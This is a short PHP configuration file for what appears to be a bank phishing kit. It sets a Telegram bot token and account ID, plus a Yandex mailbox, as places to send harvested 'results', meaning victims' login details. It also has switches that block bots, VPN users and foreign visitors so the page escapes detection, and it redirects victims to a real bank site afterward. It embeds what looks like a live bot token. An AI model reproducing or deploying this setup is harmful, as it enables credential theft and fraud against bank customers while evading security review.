<?php

##### TELEGRAM RESULT #####

//Put Your Telegram Bot Token Here.
$Token = "5001739704:AAEgxLnB_IHV9ztO_LMdVqx4wuFx0Q9w-lc";  

//Put Your Telegram Account User Id.
$Id = "2082980972";


##### EMAIL RESULT #####

//Put your Yandex Mail here & Use Mailer Supported hosting otherwise email result not working.
$Email = "example@yandex.com";


##### ANTIBOT #####

//You can change with (on) for geting antibot block results. Note: Antibot Result Only Telegram.
$AntibotResult = "off";

//You can change with (off) for vpn user unblocking.
$VpnBlock = "on";

//You can change with (off) for All country Vistitor Allow for visit.
$CountryBlock = "on";

//You can change with (on) for enable only login information page.
$OnlyLoginInfo = "off";

//You Change this url with bank url or other url.
$RedirectUrl = "https://www.peoples.com"; 

?>